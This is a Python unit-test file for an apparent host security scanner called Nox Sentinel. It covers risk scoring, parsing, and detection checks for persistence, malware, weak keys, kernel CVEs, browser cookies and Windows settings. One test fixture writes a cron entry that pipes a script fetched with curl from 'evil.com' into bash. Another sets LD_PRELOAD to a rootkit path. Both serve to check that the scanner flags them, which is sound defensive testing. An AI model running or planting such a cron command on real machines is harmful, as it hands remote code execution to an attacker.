"""Unit tests for Nox Sentinel core, checks, and rendering across platforms.

Run with: python -m unittest discover -s tests
"""

from __future__ import annotations

import contextlib
import io
import json
import os
import sqlite3
import stat
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from sentinel import ui
from sentinel.checks import ALL_CHECKS, build_checks, known_categories
from sentinel.checks.base import Check, is_posix, is_windows, mode_string
from sentinel.checks.browser import BrowserCookieAudit, FirefoxMasterPasswordCheck
from sentinel.checks.crypto import PlaintextSecretsInConfigs, WeakSshKeys, WorldReadableEnvFiles
from sentinel.checks.filesystem import SshKeyPermissions
from sentinel.checks.forensics import HistoryFileTampering, LogTamperingCheck, TmpStickyBitCheck
from sentinel.checks.malware import DeletedExeProcess, HiddenTempDirectories
from sentinel.checks.network import _hex_to_ip_port
from sentinel.checks.network_advanced import HostsHijackingCheck, PromiscuousInterfaces
from sentinel.checks.packages import KernelCveBaseline, _parse_version
from sentinel.checks.persistence import LdPreloadCheck, ShellProfileInjections, SuspiciousCronCommands
from sentinel.checks.ssh import _parse_sshd_config
from sentinel.checks.windows import AutoRunPolicy, WindowsDefenderStatus, WindowsFirewallProfiles
from sentinel.core import Finding, Report, Severity
from sentinel.engine import run_audit


class SeverityTest(unittest.TestCase):
    def test_ordering(self):
        self.assertGreater(Severity.CRITICAL, Severity.HIGH)
        self.assertGreater(Severity.LOW, Severity.INFO)

    def test_weights(self):
        self.assertEqual(Severity.OK.weight, 0)
        self.assertGreater(Severity.CRITICAL.weight, Severity.HIGH.weight)


class ReportTest(unittest.TestCase):
    def _finding(self, sev):
        return Finding("x", "cat", "t", sev)

    def test_score_capped_at_100(self):
        r = Report()
        for _ in range(10):
            r.add(self._finding(Severity.CRITICAL))
        self.assertEqual(r.risk_score, 100)
        self.assertEqual(r.grade, "F")

    def test_clean_report_is_A_plus(self):
        r = Report()
        r.add(self._finding(Severity.OK))
        r.add(self._finding(Severity.INFO))
        self.assertEqual(r.risk_score, 0)
        self.assertEqual(r.grade, "A+")

    def test_actionable_sorted_worst_first(self):
        r = Report()
        r.add(self._finding(Severity.LOW))
        r.add(self._finding(Severity.CRITICAL))
        r.add(self._finding(Severity.OK))
        acts = r.actionable
        self.assertEqual(acts[0].severity, Severity.CRITICAL)
        self.assertTrue(all(f.severity >= Severity.LOW for f in acts))

    def test_to_dict_roundtrips_json(self):
        r = Report()
        r.add(self._finding(Severity.HIGH))
        blob = json.dumps(r.to_dict())
        data = json.loads(blob)
        self.assertIn("risk_score", data)
        self.assertEqual(len(data["findings"]), 1)


class CheckRegistryTest(unittest.TestCase):
    def test_unique_ids(self):
        ids = [c.id for c in ALL_CHECKS]
        self.assertEqual(len(ids), len(set(ids)), "check ids must be unique")

    def test_category_filter(self):
        # Browser is cross-platform, so it will always be available
        cats = {"browser"}
        checks = build_checks(cats)
        self.assertTrue(checks)
        self.assertTrue(all(c.category.lower() == "browser" for c in checks))

    def test_known_categories_contains_new_modules(self):
        cats = known_categories()
        self.assertIn("Filesystem", cats)
        self.assertIn("Malware", cats)
        self.assertIn("Persistence", cats)
        self.assertIn("Crypto", cats)
        self.assertIn("Browser", cats)
        self.assertIn("Forensics", cats)
        self.assertIn("Packages", cats)
        self.assertIn("Windows", cats)


class ParsingTest(unittest.TestCase):
    def test_sshd_last_wins(self):
        cfg = _parse_sshd_config("PermitRootLogin yes\n#comment\nPermitRootLogin no\n")
        self.assertEqual(cfg["permitrootlogin"], "no")

    def test_ipv4_hex_decode(self):
        # 0100007F:0050 -> 127.0.0.1:80 (little-endian address)
        ip, port = _hex_to_ip_port("0100007F:0050", ipv6=False)
        self.assertEqual(ip, "127.0.0.1")
        self.assertEqual(port, 80)

    def test_mode_string(self):
        self.assertEqual(mode_string(0o644), "0644")

    def test_kernel_version_parser(self):
        self.assertEqual(_parse_version("5.10.0-8-amd64"), (5, 10, 0))
        self.assertEqual(_parse_version("4.4.182-nox"), (4, 4, 182))
        self.assertEqual(_parse_version("invalid"), (0, 0, 0))


class MalwareChecksTest(unittest.TestCase):
    def test_deleted_exe_check(self):
        check = DeletedExeProcess()
        findings = list(check.run())
        self.assertTrue(all(isinstance(f, Finding) for f in findings))

    def test_hidden_temp_check(self):
        check = HiddenTempDirectories()
        findings = list(check.run())
        self.assertTrue(all(isinstance(f, Finding) for f in findings))


class PersistenceChecksTest(unittest.TestCase):
    def test_suspicious_cron_detection(self):
        with tempfile.TemporaryDirectory() as tmp:
            cron_file = Path(tmp) / "crontab"
            cron_file.write_text("* * * * * root curl -s http://evil.com/sh | bash\n")
            check = SuspiciousCronCommands()
            with patch.object(check, "CRON_LOCATIONS", (str(cron_file),)):
                findings = list(check.run())
                self.assertTrue(any(f.severity == Severity.CRITICAL for f in findings))

    def test_clean_cron(self):
        with tempfile.TemporaryDirectory() as tmp:
            cron_file = Path(tmp) / "crontab"
            cron_file.write_text("* * * * * root /usr/bin/backup.sh >/dev/null 2>&1\n")
            check = SuspiciousCronCommands()
            with patch.object(check, "CRON_LOCATIONS", (str(cron_file),)):
                findings = list(check.run())
                self.assertTrue(all(f.severity == Severity.OK for f in findings))

    def test_ld_preload_detection(self):
        check = LdPreloadCheck()
        with patch.dict(os.environ, {"LD_PRELOAD": "/tmp/rootkit.so"}):
            findings = list(check.run())
            self.assertTrue(any(f.severity == Severity.HIGH for f in findings))


class CryptoChecksTest(unittest.TestCase):
    def test_weak_dsa_ssh_key(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp)
            ssh_dir = home / ".ssh"
            ssh_dir.mkdir()
            auth = ssh_dir / "authorized_keys"
            auth.write_text("ssh-dss AAAAB3NzaC1kc3MAAA... user@host\n")
            check = WeakSshKeys()
            with patch("pathlib.Path.home", return_value=home):
                findings = list(check.run())
                self.assertTrue(any(f.severity == Severity.HIGH and "DSA" in f.title for f in findings))

    def test_env_file_exposure(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp)
            env_file = home / ".env"
            env_file.write_text("DB_PASS=secret123\n")
            check = WorldReadableEnvFiles()
            with patch("pathlib.Path.home", return_value=home):
                # On systems where chmod works or default test
                findings = list(check.run())
                self.assertTrue(all(isinstance(f, Finding) for f in findings))


class NetworkAdvancedChecksTest(unittest.TestCase):
    def test_hosts_hijack_detection(self):
        with tempfile.TemporaryDirectory() as tmp:
            fake_hosts = Path(tmp) / "hosts"
            fake_hosts.write_text("10.0.0.1 google.com www.google.com\n")
            check = HostsHijackingCheck()
            with patch("sentinel.checks.network_advanced.read_text", return_value="10.0.0.1 google.com\n"):
                findings = list(check.run())
                self.assertTrue(any(f.severity == Severity.HIGH and "google.com" in f.title for f in findings))


class ForensicsChecksTest(unittest.TestCase):
    def test_log_tampering_empty_auth(self):
        with tempfile.TemporaryDirectory() as tmp:
            empty_auth = Path(tmp) / "auth.log"
            empty_auth.write_text("")
            check = LogTamperingCheck()
            with patch.object(check, "CRITICAL_LOGS", (str(empty_auth),)):
                findings = list(check.run())
                self.assertTrue(any(f.severity == Severity.HIGH for f in findings))

    def test_history_tampering(self):
        check = HistoryFileTampering()
        findings = list(check.run())
        self.assertTrue(all(isinstance(f, Finding) for f in findings))


class PackagesChecksTest(unittest.TestCase):
    def test_dirty_pipe_kernel_detection(self):
        check = KernelCveBaseline()
        with patch("platform.release", return_value="5.10.20-generic"):
            findings = list(check.run())
            self.assertTrue(any(f.severity == Severity.CRITICAL and "Dirty Pipe" in f.title for f in findings))

    def test_clean_modern_kernel(self):
        check = KernelCveBaseline()
        with patch("platform.release", return_value="6.6.15-amd64"):
            findings = list(check.run())
            self.assertTrue(any(f.severity == Severity.OK for f in findings))


class BrowserChecksTest(unittest.TestCase):
    def test_cookie_audit_sqlite_read(self):
        with tempfile.TemporaryDirectory() as tmp:
            db_path = Path(tmp) / "Cookies"
            conn = sqlite3.connect(db_path)
            cur = conn.cursor()
            cur.execute("CREATE TABLE cookies (host_key TEXT, name TEXT, is_secure INTEGER, is_httponly INTEGER)")
            cur.execute("INSERT INTO cookies VALUES ('.google.com', 'SID', 1, 1)")
            cur.execute("INSERT INTO cookies VALUES ('.github.com', 'user_session', 0, 0)")
            cur.execute("INSERT INTO cookies VALUES ('.example.com', 'theme', 0, 0)")
            conn.commit()
            conn.close()

            check = BrowserCookieAudit()
            with patch("sentinel.checks.browser._get_browser_cookie_paths", return_value=[("MockBrowser", db_path)]):
                findings = list(check.run())
                self.assertTrue(any("stored cookies" in f.title for f in findings))
                self.assertTrue(any(f.evidence and "google.com" in f.evidence[2] for f in findings))


class WindowsChecksTest(unittest.TestCase):
    def test_windows_defender_check(self):
        check = WindowsDefenderStatus()
        with patch("sentinel.checks.windows._read_reg_dword", return_value=1):
            findings = list(check.run())
            self.assertTrue(any(f.severity == Severity.CRITICAL for f in findings))

    def test_windows_firewall_disabled(self):
        check = WindowsFirewallProfiles()
        with patch("sentinel.checks.windows._read_reg_dword", return_value=0):
            findings = list(check.run())
            self.assertTrue(any(f.severity == Severity.HIGH for f in findings))


class EngineTest(unittest.TestCase):
    def test_run_audit_produces_report(self):
        report = run_audit()
        self.assertIsInstance(report, Report)
        self.assertGreater(len(report.findings), 0)
        self.assertGreaterEqual(report.duration, 0.0)

    def test_progress_hook_called(self):
        calls = []
        run_audit(progress=lambda i, t, c: calls.append((i, t)))
        self.assertTrue(calls)
        self.assertEqual(calls[-1][0], calls[-1][1])


class UiTest(unittest.TestCase):
    def test_visible_len_ignores_ansi(self):
        colored = f"{ui._rgb(1,2,3)}abc{ui.RESET}"
        self.assertEqual(ui._visible_len("abc"), 3)

    def test_gauge_length(self):
        bar = ui.risk_gauge(50, width=20)
        self.assertGreater(len(bar), 0)

    def test_render_does_not_crash(self):
        ui.disable_color()
        report = run_audit()
        with contextlib.redirect_stdout(io.StringIO()):
            ui.render_report(report, show_ok=True)


if __name__ == "__main__":
    unittest.main(verbosity=2)
